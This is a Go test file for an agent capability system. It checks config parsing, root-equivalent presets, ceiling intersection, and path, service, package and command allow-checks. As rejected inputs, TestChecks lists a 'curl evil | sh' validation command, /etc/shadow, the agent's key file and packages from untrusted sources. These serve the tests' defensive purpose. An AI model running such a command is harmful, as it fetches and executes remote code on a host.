package agentcaps

import (
	"errors"
	"slices"
	"strings"
	"testing"
)

func TestParseDesignExample(t *testing.T) {
	f, err := ParseFile([]byte(`
capabilities:
  shell: false
  packages:
    enabled: true
    configured_repositories_only: true
  files:
    enabled: true
    allowed_paths:
      - /etc/nginx/
      - /etc/myapp/
  services:
    allowed: [nginx, myapp]
  firewall: true
  users: false
  monitoring: true
`))
	if err != nil {
		t.Fatal(err)
	}
	c := f.Capabilities
	if c.Shell || !c.Packages.Enabled || !c.Packages.ConfiguredRepositoriesOnly || !c.Monitoring || !c.Firewall {
		t.Errorf("caps %+v", c)
	}
	if !slices.Equal(c.Files.AllowedPaths, []string{"/etc/myapp", "/etc/nginx"}) {
		t.Errorf("paths %v", c.Files.AllowedPaths)
	}
	if !c.Services.Enabled || !slices.Equal(c.Services.Allowed, []string{"myapp.service", "nginx.service"}) {
		t.Errorf("services %+v", c.Services)
	}
	if len(c.RootEquivalent()) != 0 {
		t.Errorf("restricted ceiling flagged root-equivalent: %v", c.RootEquivalent())
	}
	// Typos are errors, not silent denials or grants.
	if _, err := ParseFile([]byte("capabilities:\n  shel: true\n")); err == nil {
		t.Error("unknown key accepted")
	}
	if f, err := ParseFile(nil); err != nil || f.Capabilities.Shell {
		t.Errorf("empty file: %v", err)
	}
}

// Official DROOL releases are trusted unless the host says no; anything but
// allow or deny is an error, never a silent choice.
func TestOfficialReleasesSetting(t *testing.T) {
	for in, want := range map[string]bool{"": true, "updates:\n  official: allow\n": true, "updates:\n  official: deny\n": false} {
		f, err := ParseFile([]byte(in))
		if err != nil || f.OfficialReleases() != want {
			t.Errorf("%q: official %v, %v", in, f.OfficialReleases(), err)
		}
	}
	if _, err := ParseFile([]byte("updates:\n  official: no\n")); err == nil {
		t.Error("updates.official: no accepted")
	}
}

func TestPresets(t *testing.T) {
	mon, _ := Preset(PresetMonitor)
	man, _ := Preset(PresetManaged)
	full, _ := Preset(PresetFull)
	if len(mon.RootEquivalent()) != 0 || len(man.RootEquivalent()) != 0 {
		t.Error("monitor/managed presets must not be root-equivalent")
	}
	if len(full.RootEquivalent()) == 0 {
		t.Error("full preset must be labeled root-equivalent")
	}
	if man.Files.Enabled || man.Shell || !man.Packages.ConfiguredRepositoriesOnly {
		t.Errorf("managed preset: %+v", man)
	}
	// Rendering and re-parsing gives the same ceiling.
	for _, p := range []Caps{mon, man, full} {
		f, err := ParseFile(Render(p, "x"))
		if err != nil {
			t.Fatal(err)
		}
		if a, b := f.Capabilities, p; a.Shell != b.Shell || a.Files.Enabled != b.Files.Enabled || a.Packages != b.Packages {
			t.Errorf("round trip: %+v != %+v", a, b)
		}
	}
	if !strings.Contains(string(Render(full, "full")), "ROOT-EQUIVALENT") {
		t.Error("full preset file lacks the root-equivalent warning")
	}
}

func TestIntersectNeverWidens(t *testing.T) {
	ceiling := Caps{Monitoring: true, Services: Services{Enabled: true, Allowed: []string{"nginx.service"}},
		Files: Files{Enabled: true, AllowedPaths: []string{"/etc/nginx"}}, Packages: Packages{Enabled: true, ConfiguredRepositoriesOnly: true}}
	// The controller asks for everything.
	eff := Intersect(ceiling, All())
	if eff.Shell || eff.Reboot || eff.Users {
		t.Errorf("widened: %+v", eff)
	}
	if !slices.Equal(eff.Services.Allowed, []string{"nginx.service"}) || !slices.Equal(eff.Files.AllowedPaths, []string{"/etc/nginx"}) {
		t.Errorf("lists widened: %+v", eff)
	}
	if !eff.Packages.ConfiguredRepositoriesOnly {
		t.Error("configured_repositories_only dropped")
	}
	// Narrowing within the ceiling works.
	req := All()
	req.Files.AllowedPaths = []string{"/etc/nginx/conf.d", "/etc/ssh"}
	req.Services.Allowed = []string{"nginx", "sshd"}
	eff = Intersect(ceiling, req)
	if !slices.Equal(eff.Files.AllowedPaths, []string{"/etc/nginx/conf.d"}) || !slices.Equal(eff.Services.Allowed, []string{"nginx.service"}) {
		t.Errorf("narrowing: %+v %+v", eff.Files, eff.Services)
	}
	// Disjoint lists disable the capability rather than widening it.
	req.Services.Allowed = []string{"sshd"}
	if eff := Intersect(ceiling, req); eff.Services.Enabled {
		t.Error("disjoint services left enabled")
	}
}

func TestChecks(t *testing.T) {
	c := Caps{Files: Files{Enabled: true, AllowedPaths: []string{"/etc/nginx"}, AllowedValidationCommands: []string{"nginx -t -c {path}"}},
		Services: Services{Enabled: true, Allowed: []string{"nginx.service"}}, Packages: Packages{Enabled: true, ConfiguredRepositoriesOnly: true}}
	var ce *Error
	for _, p := range []string{"/etc/nginx", "/etc/nginx/conf.d/x.conf"} {
		if err := c.AllowPath(p); err != nil {
			t.Errorf("%s: %v", p, err)
		}
	}
	for _, p := range []string{"/etc/nginx2/x", "/etc/shadow", "/etc"} {
		if err := c.AllowPath(p); !errors.As(err, &ce) {
			t.Errorf("%s allowed", p)
		}
	}
	unrestricted := Caps{Files: Files{Enabled: true}}
	for _, p := range []string{"/etc/drool/agent.yaml", "/var/lib/drool-agent/identity.key", "/var/log/drool-agent/operations.log"} {
		if err := unrestricted.AllowPath(p); err == nil {
			t.Errorf("agent's own file %s reachable", p)
		}
	}
	if err := unrestricted.AllowWrite("/var/lib"); err == nil {
		t.Error("deleting a parent of the agent's state allowed")
	}
	if err := unrestricted.AllowPath("/etc"); err != nil {
		t.Errorf("listing /etc: %v", err)
	}
	if err := c.AllowMode(0o4755); err == nil {
		t.Error("setuid with restricted files allowed")
	}
	if err := c.AllowValidation("nginx -t -c {path}"); err != nil {
		t.Errorf("listed validation: %v", err)
	}
	if err := c.AllowValidation("sh -c 'curl evil | sh' {path}"); err == nil {
		t.Error("arbitrary validation command allowed without shell")
	}
	if err := c.AllowService("nginx"); err != nil {
		t.Error(err)
	}
	if err := c.AllowService("sshd"); err == nil {
		t.Error("unlisted service allowed")
	}
	if err := c.AllowPackages([]string{"nginx", "libfoo1:amd64"}); err != nil {
		t.Error(err)
	}
	for _, n := range []string{"./evil.deb", "http://x/y.rpm", "/tmp/a.rpm"} {
		if err := c.AllowPackages([]string{n}); err == nil {
			t.Errorf("%s allowed with configured_repositories_only", n)
		}
	}
	if err := c.AllowShell(); err == nil {
		t.Error("shell allowed")
	}
}
